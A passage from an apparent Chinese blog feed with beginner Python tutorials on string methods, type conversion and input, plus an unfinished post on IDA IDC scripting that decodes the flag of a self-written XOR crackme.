您输入的密码是521</span><br><span class="line"># &lt;class &apos;str&apos;&gt;</span><br></pre></td></tr></table></figure><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><blockquote><p>切片是指对操作对象截取其中一部分的而操作。字符串，列表，元组都支持切片操作。</p></blockquote><blockquote><p>语法：序列[开始位置下标:结束位置下表:步长]</p></blockquote><blockquote><p>注意：不包含结束位置下表对应的的数据，正负整数均可；步长是选取间隔，正负整数均可默认为1</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">str1=&apos;0123456789&apos;</span><br><span class="line">print(str1[2:5:1]) #234</span><br><span class="line">print(str1[2:5:2]) #24 步长相当于 下标 +2</span><br><span class="line">print(str1[2:5]) #234 </span><br><span class="line">print(str1[:5]) #01234   如果不写开始，默认从零开始选取</span><br><span class="line">print(str1[2:])#2345678 不写结束 表示选取到最后所有</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#负数测试</span><br><span class="line">print(str1[::-1])#9876543210 如果步长为负数，表示倒着选取</span><br><span class="line">print(str1[-4:-1]) #678  下标表示最后一个顺据，依次向前类推</span><br><span class="line"></span><br><span class="line">#终极测试</span><br><span class="line">print(str1[-4:-1:1])#678</span><br><span class="line">print(str1[-4:-1:-1])# 不能去除数据：从-4开始到-1结束，选取方向从左到右，但是-1 步长表示 从右向左   冲突了！</span><br><span class="line">print(str1[-1:-4:-1])#这样就可以了 987</span><br></pre></td></tr></table></figure><h2 id="常用操作方法："><a href="#常用操作方法：" class="headerlink" title="常用操作方法："></a>常用操作方法：</h2><ul><li>查找</li><li>修改</li><li>判断<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><blockquote><p>查找方法 即是查找字串在字符串中的位置 或出现的次数</p></blockquote></li></ul><h4 id="find"><a href="#find" class="headerlink" title="find():"></a>find():</h4><blockquote><p>检测某个字串是否包含在这个字符串中，如果在，返回这个字串开始的位置下表，否则则返回 -1</p></blockquote><blockquote><p>语法： 字符串序列.find(字串,开始位置下标,结束位置下标)</p></blockquote><blockquote><p>注意：开始和结束位置下表可以忽略，表示在整个字符串序列中找</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line"></span><br><span class="line">print(mystr.find(&apos;and&apos;))# 12</span><br><span class="line">print(mystr.find(&apos;and&apos;,15,30))# 23</span><br><span class="line">print(mystr.find(&apos;ands&apos;))#  返回-1    abds 不存在</span><br></pre></td></tr></table></figure><h4 id="index"><a href="#index" class="headerlink" title="index():"></a>index():</h4><blockquote><p>语法和find()函数相同  但find()查找不到时返回 -1 而 index函数 报错</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line"></span><br><span class="line">print(mystr.index(&apos;and&apos;))# 12</span><br><span class="line">print(mystr.index(&apos;and&apos;,15,30))# 23</span><br><span class="line">print(mystr.index(&apos;ands&apos;))#  ValueError: substring not found</span><br></pre></td></tr></table></figure><h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><blockquote><p>返回某个字串在字符串中出现的次数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line"></span><br><span class="line">print(mystr.count(&apos;and&apos;,15,30))#1</span><br><span class="line">print(mystr.count(&apos;and&apos;)) #3</span><br><span class="line">print(mystr.count(&apos;ands&apos;)) #0</span><br></pre></td></tr></table></figure><blockquote><p>rfind()：和find()功能相同，但查找方向从右侧开始</p></blockquote><blockquote><p>rindex()：和index()功能相同，但查找方向从右侧开始</p></blockquote><h3 id="修改操作"><a href="#修改操作" class="headerlink" title="修改操作"></a>修改操作</h3><blockquote><p>字符串修改，就是通过函数的形式修改字符串中的数据。</p></blockquote><ul><li>replace()：替换<blockquote><p>语法：</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串序列.replace(旧字串,新字串,替换次数)</span><br></pre></td></tr></table></figure><blockquote><p>注意：替换次数如果超过子串出现次数，则替换次数为该次数出现的次数。</p></blockquote><blockquote><p>例子：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line"></span><br><span class="line">print(mystr.replace(&apos;and&apos;,&apos;he&apos;))  #replace()返回值是 修改后的字符串</span><br><span class="line">#hello world he itcast he itheima he Python</span><br><span class="line"></span><br><span class="line">print(mystr.replace(&apos;and&apos;,&apos;he&apos;,1))#只替换一次</span><br><span class="line">#hello world he itcast and itheima and Python</span><br><span class="line"></span><br><span class="line">print(mystr.replace(&apos;and&apos;,&apos;he&apos;,10))</span><br><span class="line">#替换次数(10)如果超过子串出现次数(3)，则替换次数为该次数出现的次数(3)</span><br><span class="line">#hello world he itcast he itheima he Python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(mystr)</span><br><span class="line">#hello world and itcast and itheima and Python</span><br></pre></td></tr></table></figure><blockquote><p>调用replace函数后，原字符串的数据没有变化，说明 字符串是不可变数据类型</p></blockquote><blockquote><p>数据是否改变划分为   可变类型  和 不可变类型</p></blockquote><h4 id="split-："><a href="#split-：" class="headerlink" title="split()："></a>split()：</h4><blockquote><p>按照指定字符分割字符串，返回一个列表</p></blockquote><blockquote><p>语法：字符串序列.split(分割字符,num)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line">#split()    分割，返回一个列表，丢失分割字符</span><br><span class="line">list1=mystr.split(&apos;and&apos;)</span><br><span class="line">print(list1)#[&apos;hello world &apos;, &apos; itcast &apos;, &apos; itheima &apos;, &apos; Python&apos;]</span><br><span class="line">list2=mystr.split(&apos;and&apos;,2)</span><br><span class="line">print(list2)#[&apos;hello world &apos;, &apos; itcast &apos;, &apos; itheima and Python&apos;]</span><br></pre></td></tr></table></figure><h4 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h4><blockquote><p>用一个字符或子串合并字符串，即是将多个字符串合并为一个新的字符串</p></blockquote><blockquote><p>语法：字符或子串.join(多字符串组成的序列)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#join()   合并列表里的字符串数据为1个大字符串</span><br><span class="line">mylist=[&apos;aa&apos;,&apos;bb&apos;&apos;[cc&apos;]</span><br><span class="line">new_str=&apos;...&apos;.join(mylist)</span><br><span class="line">print(new_str)</span><br><span class="line">#aa...bb...cc</span><br></pre></td></tr></table></figure><h4 id="strip-lstrip-rstrip"><a href="#strip-lstrip-rstrip" class="headerlink" title="strip()  lstrip()  rstrip()"></a>strip()  lstrip()  rstrip()</h4><blockquote><p>删除字符串空白字符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;      hello world and itcast and itheima and Python        &quot;</span><br><span class="line">new_str1=mystr.lstrip()#删除左侧空白字符</span><br><span class="line"></span><br><span class="line">print(new_str1)</span><br><span class="line">new_str2=mystr.rstrip()#删除右侧空白字符</span><br><span class="line">print(new_str2)</span><br><span class="line">new_str3=mystr.strip()#删除左右两侧空白字符</span><br><span class="line">print(new_str3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hello world and itcast and itheima and Python        </span><br><span class="line">#       hello world and itcast and itheima and Python</span><br><span class="line"># hello world and itcast and itheima and Python</span><br></pre></td></tr></table></figure><blockquote><p>字符串大小写转换：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mystr=&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line">new_str1=mystr.capitalize()#字符串首字母大写</span><br><span class="line">print(new_str1)</span><br><span class="line"># Hello world and itcast and itheima and python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_str2=mystr.title()#字符串每个字符首字母大写</span><br><span class="line">print(new_str2)</span><br><span class="line"># Hello World And Itcast And Itheima And Python</span><br><span class="line"></span><br><span class="line">new_str3=mystr.upper()#小写转大写</span><br><span class="line">print(new_str3)</span><br><span class="line"># HELLO WORLD AND ITCAST AND ITHEIMA AND PYTHON</span><br><span class="line"></span><br><span class="line">new_str4=mystr.lower()#大写转小写</span><br><span class="line">print(new_str4)</span><br><span class="line"># hello world and itcast and itheima and python</span><br></pre></td></tr></table></figure><h4 id="ljust-rjust-center"><a href="#ljust-rjust-center" class="headerlink" title="ljust() rjust() center()"></a>ljust() rjust() center()</h4><blockquote><p>返回一个原字符串左(右，居中对齐)，并使用指定字符(默认空格)填充至对应长度的新字符串</p></blockquote><blockquote><p>语法:字符串序列.ljust(长度,填充字符)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mystr = &apos;hello&apos;</span><br><span class="line"></span><br><span class="line">print(mystr.ljust(10))#hello       默认填充字符是 空格</span><br><span class="line">print(mystr.ljust(10,&apos;.&apos;))#hello.....</span><br><span class="line"></span><br><span class="line">print(mystr.rjust(10,&apos;.&apos;))#.....hello</span><br><span class="line"></span><br><span class="line">print(mystr.center(10,&apos;.&apos;))#..hello...     不是绝对居中</span><br></pre></td></tr></table></figure><blockquote><p>要注意字符串是不可变类型，所以需要新的变量接受它！</p></blockquote><h3 id="判断操作"><a href="#判断操作" class="headerlink" title="判断操作"></a>判断操作</h3><blockquote><p>判断真假，返回bool型类型：True或False</p></blockquote><h4 id="startswith"><a href="#startswith" class="headerlink" title="startswith():"></a>startswith():</h4><blockquote><p>检查字符串是否是以指定子串开头，是 返回True 不然 False。如果设置开始结束位置下标，则在指定范围内检查</p></blockquote><blockquote><p>语法：字符串序列.startwith(子串,开始位置下表，结束位置下标)</p></blockquote><h4 id="endswith"><a href="#endswith" class="headerlink" title="endswith():"></a>endswith():</h4><blockquote><p>同上：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mystr =&quot;hello world and itcast and itheima and Python&quot;</span><br><span class="line">#startswith():检查字符串是否是以指定子串开头</span><br><span class="line">print(mystr.startswith(&apos;hello&apos;))#True</span><br><span class="line">print(mystr.startswith(&apos;hel&apos;))#True</span><br><span class="line">print(mystr.startswith(&apos;hels&apos;))#False</span><br><span class="line"></span><br><span class="line">#endswith():检查字符串是否是以指定子串结尾</span><br><span class="line">print(mystr.endswith(&apos;Python&apos;))#True</span><br><span class="line">print(mystr.endswith(&apos;Pythons&apos;))#False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(mystr.endswith(&apos;python&apos;))#False     大小写敏感</span><br></pre></td></tr></table></figure><h4 id="isalpha"><a href="#isalpha" class="headerlink" title="isalpha():"></a>isalpha():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是字母则返回True，否则返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystr1=&apos;hello&apos;</span><br><span class="line">mystr2=&apos;hello123&apos;</span><br><span class="line">print(mystr1.isalpha())#True</span><br><span class="line">print(mystr2.isalpha())#False</span><br></pre></td></tr></table></figure><h4 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit():"></a>isdigit():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是数字则返回True，否则返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystr1=&apos;hello&apos;</span><br><span class="line">mystr2=&apos;123&apos;</span><br><span class="line">print(mystr1.isdigit())#False</span><br><span class="line">print(mystr2.isdigit())#True</span><br></pre></td></tr></table></figure><h4 id="isalnum"><a href="#isalnum" class="headerlink" title="isalnum():"></a>isalnum():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是数字或者字母则返回True，否则返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystr1=&apos;helloworld!&apos;</span><br><span class="line">mystr2=&apos;hello123&apos;</span><br><span class="line">print(mystr1.isalnum())#False !不是字母送一False</span><br><span class="line">print(mystr2.isalnum())#True</span><br></pre></td></tr></table></figure><h4 id="isspace"><a href="#isspace" class="headerlink" title="isspace():"></a>isspace():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是空白则返回True，否则返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystr1=&apos;        &apos;</span><br><span class="line">mystr2=&apos;chkds 65 622&apos;</span><br><span class="line">print(mystr1.isspace())#True 制表符 也属于空白</span><br><span class="line">print(mystr2.isspace())#False</span><br></pre></td></tr></table></figure><p>我可以的，啊！<br><img src="https://s2.ax1x.com/2019/09/19/nOs2TJ.jpg" alt="nOs2TJ.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迷茫了快，不能这个样子！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>idc脚本</title>
    <link href="http://yoursite.com/2019/09/18/idc%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2019/09/18/idc脚本/</id>
    <published>2019-09-18T15:51:43.000Z</published>
    <updated>2019-09-18T16:19:47.546Z</updated>
    
    <content type="html"><![CDATA[<p>半成品，有些累了！明天要将它完善！</p><a id="more"></a><h1 id="idc预备基础知识"><a href="#idc预备基础知识" class="headerlink" title="idc预备基础知识"></a>idc预备基础知识</h1><blockquote><p>首先看下了解下执行脚本的常用打开方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">File-&gt;Script File:运行独立脚本</span><br><span class="line">File-&gt;IDC Command</span><br><span class="line">File-&gt;Python Command</span><br><span class="line"></span><br><span class="line">//另外，之前运行过的脚本可以在View-&gt;Rencent Script 找到</span><br></pre></td></tr></table></figure><blockquote><p>如果想执行一个临时写的脚本(不长久保存可以在使用IDC Command窗口)或者是输出窗口下面的IDC单行命令行（其实也可以执行多行命令，只需用分号 隔开就好）</p></blockquote><h1 id="IDC语言"><a href="#IDC语言" class="headerlink" title="IDC语言"></a>IDC语言</h1><blockquote><p>ID脚本语言 类似 C语言，C++，并且有着很多IDC函数，很有用！</p></blockquote><h2 id="IDC变量"><a href="#IDC变量" class="headerlink" title="IDC变量"></a>IDC变量</h2><blockquote><p>IDC是一种类型松散的语言，这表示它的变量没有明确的类型。IDC使用3种数据类型，整形(long),字符串，和浮点型。从IDA5.6开始，IDC又加入了许多变量类型，包括对象，引用，和函数指针。</p></blockquote><blockquote><p>声明变量：使用任何变量前都必须声明变量</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//IDC关键字auto 用于引用一个局部变量</span><br><span class="line">auto addr;</span><br><span class="line">auto reg,val;</span><br><span class="line">auto count=0;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//IDC关键字autoextern用于引用一个全局变量</span><br><span class="line">extern outsideGlobal;</span><br><span class="line"></span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    extern insideGlobal;</span><br><span class="line">    outsideGlobal=&quot;Global&quot;;</span><br><span class="line">    insideGlobal=1;</span><br><span class="line">&#125;</span><br><span class="line">//这里要注意，用户自己定义的函数只能运行独立脚本的时候才有效。</span><br></pre></td></tr></table></figure><h1 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h1><p>我们用VS2015 生成下release版本的32程序，然后ida打开分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">//the xor key is &apos;B&apos; ，异或的key</span><br><span class="line"></span><br><span class="line">int Verify(char *Flag) &#123;</span><br><span class="line">int i;</span><br><span class="line">int tar[10] = &#123; 00, 43, 44, 29, 14, 47, 47, 10, 29, 1 &#125;; //这里是关键数据</span><br><span class="line">for (i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">if (Flag[i] != tar[i]) &#123;</span><br><span class="line">printf(&quot;You are wrong\n&quot;); //错误提示</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Congratulations...\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">int i;</span><br><span class="line">char flag[11] = &quot;\0&quot;;</span><br><span class="line">scanf_s(&quot;%s&quot;, flag, sizeof(flag));//输入的flag</span><br><span class="line">printf(&quot;%s\n&quot;, flag);</span><br><span class="line">for (i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">flag[i] = flag[i] ^ 66; //将输入异或</span><br><span class="line">&#125;</span><br><span class="line">Verify(flag);//调用检测函数</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>明天继续编辑吧！有些累了！关键数据在数据段的00102140 和 00402150</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rdata:00402100                                         ; DATA XREF: ___report_gsfailure+ED↑o</span><br><span class="line">.rdata:00402108 aYouAreWrong    db &apos;You are wrong&apos;,0Ah,0</span><br><span class="line">.rdata:00402108                                         ; DATA XREF: _main:loc_4010A8↑o</span><br><span class="line">.rdata:00402117                 align 4</span><br><span class="line">.rdata:00402118 aCongratulation db &apos;Congratulations...&apos;,0Ah,0</span><br><span class="line">.rdata:00402118                                         ; DATA XREF: _main+A1↑o</span><br><span class="line">.rdata:0040212C aS              db &apos;%s&apos;,0               ; DATA XREF: _main+22↑o</span><br><span class="line">.rdata:0040212F                 align 10h</span><br><span class="line">.rdata:00402130 aS_0            db &apos;%s&apos;,0Ah,0           ; DATA XREF: _main+35↑o</span><br><span class="line">.rdata:00402134                 align 10h</span><br><span class="line">.rdata:00402140 xmmword_402140  xmmword 0A0000002F0000002F0000000Eh</span><br><span class="line">.rdata:00402140                                         ; DATA XREF: _main+7E↑r</span><br><span class="line">.rdata:00402150 xmmword_402150  xmmword 1D0000002C0000002B00000000h</span><br><span class="line">.rdata:00402150                                         ; DATA XREF: _main+3F↑r</span><br><span class="line">.rdata:00402160 ; Debug Directory entries</span><br><span class="line">.rdata:00402160                 dd 0                    ; Characteristics</span><br></pre></td></tr></table></figure><h2 id="我们使用idc编写脚本（很方便）"><a href="#我们使用idc编写脚本（很方便）" class="headerlink" title="我们使用idc编写脚本（很方便）"></a>我们使用idc编写脚本（很方便）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">auto from1 = 0x00402150;</span><br><span class="line">auto from2 = 0x00402140;</span><br><span class="line">auto i,x;</span><br><span class="line"></span><br><span class="line">for(i=0;i&lt;4;i=i+1)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Dword(from1);</span><br><span class="line">        Message(&quot;%s&quot;,x^0x42);</span><br><span class="line">        from1=from1+4;</span><br><span class="line">    &#125;</span><br><span class="line">for(i=0;i&lt;4;i=i+1)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Dword(from2);</span><br><span class="line">        Message(&quot;%s&quot;,x^0x42);</span><br><span class="line">        from2=from2+4;</span><br><span class="line">    &#125;</span><br><span class="line">Message(&quot;%s&quot;,0x1D^0x42);</span><br><span class="line">Message(&quot;%s&quot;,0x01^0x42);</span><br><span class="line">#Bin_LmmH_C</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/binlmmhc/p/6166286.html更详细" target="_blank" rel="noopener">https://www.cnblogs.com/binlmmhc/p/6166286.html更详细</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;半成品，有些累了！明天要将它完善！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习1</title>
    <link href="http://yoursite.com/2019/09/17/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A01/"/>
    <id>http://yoursite.com/2019/09/17/python系统学习1/</id>
    <published>2019-09-16T16:22:35.000Z</published>
    <updated>2019-09-17T16:39:15.326Z</updated>
    
    <content type="html"><![CDATA[<p>其实，今天让我心里感到安慰的是  学会了使用idc dump数据！但明天再整理吧！</p><a id="more"></a><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input(&quot;提示信息&quot;)</span><br></pre></td></tr></table></figure><p>输入特点：</p><ol><li>当程序执行到input，等待用户输入，输入完成后才可以继续向下执行</li><li>在python中，input接受用户输入后，一般存储到变量，方便使用</li><li>input会把接收到的任意输入的数据当成字符串处理</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">password=input(&apos;请输入您的密码：&apos;)</span><br><span class="line">print(f&apos;您输入的密码是&#123;password&#125;&apos;)</span><br><span class="line">print(type(password))</span><br><span class="line"># 请输入您的密码：123456</span><br><span class="line"># # 您输入的密码是123456</span><br><span class="line"># # &lt;class &apos;str&apos;&gt;</span><br></pre></td></tr></table></figure><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>int(x,[base])</td><td>将x转换为一个整数</td></tr><tr><td>float(x)</td><td>将x转换为一个浮点数</td></tr><tr><td>complex(real[,imag])</td><td>创建一个复数，real为实部，imag为虚部</td></tr><tr><td>str(x)</td><td>将对象转化为字符串</td></tr><tr><td>repr(x)</td><td>将对象转换为表达式字符串</td></tr><tr><td>eval(str)</td><td>用来计算在字符串中的有效Python表达式，并返回一个对象</td></tr><tr><td>tuple(s)</td><td>将序列s 转换为一个元组</td></tr><tr><td>list(s)</td><td>将序列s转换为一个表格</td></tr><tr><td>chr(x)</td><td>将一个整数转换为一个Unicode字符</td></tr><tr><td>ord(x)</td><td>将一个字符转换为它的ASCII整数值</td></tr><tr><td>hex(x)</td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td>row 1 col 1</td><td>row 1 col 2</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">num1=1</span><br><span class="line">str0=&apos;10&apos;</span><br><span class="line">print(type(float(num1)))#&lt;class &apos;float&apos;&gt;</span><br><span class="line">print(float(num1))#1.0    转换成浮点型 小数点后多了个 0 以示区别</span><br><span class="line">print(float(str0))#10.0   字符串类型  也可以转化为  浮点型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#tuple():将一个序列转化成元组</span><br><span class="line">list1=[10,20,30]</span><br><span class="line">print(tuple(list1))#(10, 20, 30)</span><br><span class="line">#list():将一个元组转化成列表</span><br><span class="line">t1=(100,200,300)</span><br><span class="line">print(list(t1))#[100, 200, 300]</span><br><span class="line">#eval():计算在字符串中的有效Python表达式，并返回一个对象</span><br><span class="line">str1=&apos;1&apos;</span><br><span class="line">str2=&apos;1.1&apos;</span><br><span class="line">str3=&apos;(100,200,300)&apos;</span><br><span class="line">print(eval(str1))</span><br><span class="line">print(type(eval(str2)))</span><br><span class="line">print(eval(str3))</span><br><span class="line"># 1</span><br><span class="line"># 1.1</span><br><span class="line"># (100, 200, 300)</span><br></pre></td></tr></table></figure><p>对了，python交互模式直接在PyCharm下端 点击PyDev console即可进入，若清空，里面的输入历史必须关闭工程才可以，一般不需要清楚。</p><h2 id="运算符的分类"><a href="#运算符的分类" class="headerlink" title="运算符的分类"></a>运算符的分类</h2><ul><li>算数运算符<blockquote><p>优先级的排序：()高于*<em>(指数)高于</em>，/，//，%，高于+，-</p></blockquote></li><li>赋值运算符</li><li>复合赋值运算符</li></ul><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+=</td><td>加法赋值运算符</td><td>c+=a 